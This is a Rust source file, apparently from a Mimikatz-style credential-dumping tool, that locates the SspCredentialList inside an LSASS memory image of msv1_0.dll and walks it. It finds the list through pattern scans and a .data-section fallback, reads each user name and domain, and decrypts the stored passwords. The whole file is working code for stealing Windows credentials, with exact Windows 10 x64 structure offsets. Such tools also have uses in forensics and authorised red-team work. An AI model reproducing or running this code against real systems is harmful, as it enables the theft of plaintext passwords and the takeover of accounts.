use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::SspCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// KIWI_SSP_CREDENTIAL_LIST_ENTRY offsets (Windows 10 x64):
///   +0x00: Flink
///   +0x08: Blink
///   +0x10: References (ULONG + 4 pad)
///   +0x18: CredentialReferences (ULONG + 4 pad)
///   +0x20: LUID (8 bytes)
///   +0x28: Flags (ULONG + 4 pad)
///   +0x30: credentials_ptr (PVOID -> KIWI_SSP_PRIMARY_CREDENTIAL)
///
/// KIWI_SSP_PRIMARY_CREDENTIAL:
///   +0x00: UserName (UNICODE_STRING, 16 bytes)
///   +0x10: DomainName (UNICODE_STRING, 16 bytes)
///   +0x20: Password (UNICODE_STRING, 16 bytes, encrypted)
const OFFSET_FLINK: u64 = 0x00;
const OFFSET_LUID: u64 = 0x20;
const OFFSET_CRED_PTR: u64 = 0x30;

const CRED_USERNAME: u64 = 0x00;
const CRED_DOMAIN: u64 = 0x10;
const CRED_PASSWORD: u64 = 0x20;

/// Extract SSP credentials from msv1_0.dll.
///
/// SSP stores credentials for custom Security Support Providers.
/// The SspCredentialList is a doubly-linked list in msv1_0.dll.
pub fn extract_ssp_credentials(
    vmem: &impl VirtualMemory,
    msv_base: u64,
    _msv_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, SspCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;

    // Try .text pattern scan first, fall back to .data section scan
    let list_addr = match pe.find_section(".text") {
        Some(text) => {
            let text_base = msv_base + text.virtual_address as u64;
            match patterns::find_pattern(
                vmem,
                text_base,
                text.virtual_size,
                patterns::SSP_CREDENTIAL_PATTERNS,
                "SspCredentialList",
            ) {
                Ok((pattern_addr, _)) => patterns::resolve_rip_relative(vmem, pattern_addr, 7)?,
                Err(e) => {
                    log::debug!(
                        "SSP .text pattern scan failed ({}), trying .data fallback",
                        e
                    );
                    find_ssp_list_in_data(vmem, &pe, msv_base)?
                }
            }
        }
        None => find_ssp_list_in_data(vmem, &pe, msv_base)?,
    };

    log::info!("SSP SspCredentialList at 0x{:x}", list_addr);
    walk_ssp_list(vmem, list_addr, keys)
}

/// Walk the SspCredentialList linked list.
fn walk_ssp_list(
    vmem: &impl VirtualMemory,
    list_addr: u64,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, SspCredential)>> {
    let mut results = Vec::new();

    let head_flink = vmem.read_virt_u64(list_addr)?;
    if head_flink == 0 || head_flink == list_addr {
        log::info!("SSP: credential list is empty");
        return Ok(results);
    }

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + OFFSET_LUID).unwrap_or(0);
        let cred_ptr = vmem.read_virt_u64(current + OFFSET_CRED_PTR).unwrap_or(0);

        if cred_ptr > 0x10000 && (cred_ptr >> 48) == 0 {
            let username = vmem
                .read_win_unicode_string(cred_ptr + CRED_USERNAME)
                .unwrap_or_default();
            let domain = vmem
                .read_win_unicode_string(cred_ptr + CRED_DOMAIN)
                .unwrap_or_default();

            if !username.is_empty() {
                let password = crate::lsass::crypto::decrypt_unicode_string_password(
                    vmem,
                    cred_ptr + CRED_PASSWORD,
                    keys,
                );

                log::debug!(
                    "SSP: LUID=0x{:x} user={} domain={} pwd_len={}",
                    luid,
                    username,
                    domain,
                    password.len()
                );
                results.push((
                    luid,
                    SspCredential {
                        username,
                        domain,
                        password,
                    },
                ));
            }
        }

        current = match vmem.read_virt_u64(current + OFFSET_FLINK) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    let with_passwords = results
        .iter()
        .filter(|(_, c)| !c.password.is_empty())
        .count();
    log::info!(
        "SSP: found {} entries ({} with passwords)",
        results.len(),
        with_passwords
    );

    Ok(results)
}

/// Fallback: scan msv1_0.dll .data section for SspCredentialList LIST_ENTRY head.
///
/// Validates candidates by checking that the first entry has a valid LUID
/// and credentials pointer at the expected offsets.
fn find_ssp_list_in_data(vmem: &impl VirtualMemory, pe: &PeHeaders, msv_base: u64) -> Result<u64> {
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        crate::error::GovmemError::PatternNotFound(".data section in msv1_0.dll".to_string())
    })?;

    let data_base = msv_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    log::debug!(
        "SSP: scanning msv1_0.dll .data for SspCredentialList: base=0x{:x} size=0x{:x}",
        data_base,
        data_size
    );

    for off in (0..data_size.saturating_sub(16)).step_by(8) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());

        let list_addr = data_base + off as u64;

        // Self-referencing empty list (SspCredentialList typically empty)
        if flink == list_addr && blink == list_addr {
            // This could be SspCredentialList - verify it's not some other list
            // by checking it's in the first part of .data (globals are early)
            if off < 0x1000 {
                log::debug!(
                    "SSP: found empty SspCredentialList candidate at 0x{:x} (self-referencing)",
                    list_addr
                );
                return Ok(list_addr);
            }
            continue;
        }

        if flink < 0x10000 || (flink >> 48) != 0 {
            continue;
        }
        if blink < 0x10000 || (blink >> 48) != 0 {
            continue;
        }
        // Must point to heap, not within the DLL
        if flink >= msv_base && flink < msv_base + 0x100000 {
            continue;
        }

        // Validate: first entry's Flink
        let entry_flink = match vmem.read_virt_u64(flink) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if entry_flink != list_addr && (entry_flink < 0x10000 || (entry_flink >> 48) != 0) {
            continue;
        }

        // Validate: LUID at expected offset
        let luid = match vmem.read_virt_u64(flink + OFFSET_LUID) {
            Ok(l) => l,
            Err(_) => continue,
        };
        if luid == 0 || luid > 0xFFFFFFFF {
            continue;
        }

        // Validate: credentials pointer at expected offset
        let cred_ptr = match vmem.read_virt_u64(flink + OFFSET_CRED_PTR) {
            Ok(p) => p,
            Err(_) => continue,
        };
        if cred_ptr < 0x10000 || (cred_ptr >> 48) != 0 {
            continue;
        }

        log::debug!(
            "SSP: found SspCredentialList candidate at 0x{:x}: flink=0x{:x} LUID=0x{:x}",
            list_addr,
            flink,
            luid
        );
        return Ok(list_addr);
    }

    // SSP list is typically empty (no custom SSPs). Return a "not found" to signal this.
    Err(crate::error::GovmemError::PatternNotFound(
        "SspCredentialList in msv1_0.dll .data section".to_string(),
    ))
}
